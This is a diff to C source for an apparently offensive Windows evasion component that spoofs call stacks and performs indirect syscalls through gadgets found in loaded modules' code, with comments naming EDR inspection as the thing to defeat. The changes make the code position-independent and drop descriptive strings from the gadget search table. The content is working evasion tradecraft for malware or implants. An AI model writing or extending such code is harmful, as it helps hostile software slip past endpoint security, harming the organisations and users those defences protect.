@@ -121,12 +121,9 @@ typedef struct {
 
 static BmSpoofState g_spoof = {0};
 
-/* Assembly globals (defined in bm_spoof_asm.s) */
-extern UINT_PTR g_spoof_real_rsp;
-extern UINT_PTR g_spoof_synth_rsp;
-
-/* Stargate's gadget address (defined in indirect_syscalls_asm.s) */
-extern void *g_syscall_gadget;
+/* Assembly globals (also referenced from bm_spoof_asm.s via RIP-relative). */
+UINT_PTR g_spoof_real_rsp __attribute__((visibility("hidden")));
+UINT_PTR g_spoof_synth_rsp __attribute__((visibility("hidden")));
 
 /* Assembly dispatch function */
 extern NTSTATUS bm_spoof_execute(DWORD ssn, int argc, void **argv);
@@ -282,13 +279,13 @@ static int find_add_rsp_ret(HMODULE base, BYTE *text, SIZE_T text_size,
  * in the chain, so it's the deepest frame the EDR would examine).
  * ======================================================================== */
 
-/* Candidate patterns for jmp-to-rbx */
-typedef struct { BYTE b1; BYTE b2; const char *desc; } JmpPattern;
+/* Candidate patterns for jmp-to-rbx (no string pointers — those are absolute VAs). */
+typedef struct { BYTE b1; BYTE b2; } JmpPattern;
 
 static const JmpPattern g_jmp_patterns[] = {
-    { 0xFF, 0xE3, "jmp rbx"       },
-    { 0xFF, 0xD3, "call rbx"      },
-    { 0x53, 0xC3, "push rbx; ret" },
+    { 0xFF, 0xE3 },
+    { 0xFF, 0xD3 },
+    { 0x53, 0xC3 },
 };
 #define N_JMP_PATTERNS (sizeof(g_jmp_patterns) / sizeof(g_jmp_patterns[0]))
 
@@ -304,8 +301,8 @@ static int find_jmp_rbx(HMODULE base, BYTE *text, SIZE_T text_size,
                 if (addr_in_runtime_function(base, pdata, pdata_count, gadget_addr)) {
                     out->addr = gadget_addr;
                     out->frame_size = 0;
-                    SDBG("found %s @ %p (in RUNTIME_FUNCTION)",
-                         g_jmp_patterns[p].desc, gadget_addr);
+                    SDBG("found jmp-rbx pattern @ %p (in RUNTIME_FUNCTION)",
+                         gadget_addr);
                     return 0;
                 }
             }
@@ -319,8 +316,8 @@ static int find_jmp_rbx(HMODULE base, BYTE *text, SIZE_T text_size,
                 text[i+1] == g_jmp_patterns[p].b2) {
                 out->addr = text + i;
                 out->frame_size = 0;
-                SDBG("found %s @ %p (outside RUNTIME_FUNCTION — fallback)",
-                     g_jmp_patterns[p].desc, out->addr);
+                SDBG("found jmp-rbx pattern @ %p (outside RUNTIME_FUNCTION — fallback)",
+                     out->addr);
                 return 0;
             }
         }
@@ -497,14 +494,14 @@ static void build_synth_frames(int argc, void **argv) {
  * Set g_syscall_gadget before each spoofed call (same as SG_SET_GADGET).
  * ======================================================================== */
 
-/* Import Stargate internals we need */
-extern void *g_shared_gadget;  /* From stargate.c — fallback gadget */
-
 static void set_gadget_for_sc(SgSyscall *sc) {
     if (sc->gadget)
-        g_syscall_gadget = sc->gadget;
-    else if (g_shared_gadget)
-        g_syscall_gadget = g_shared_gadget;
+        sg_set_syscall_gadget(sc->gadget);
+    else {
+        void *g = sg_get_shared_gadget();
+        if (g)
+            sg_set_syscall_gadget(g);
+    }
 }
 
 /* ========================================================================
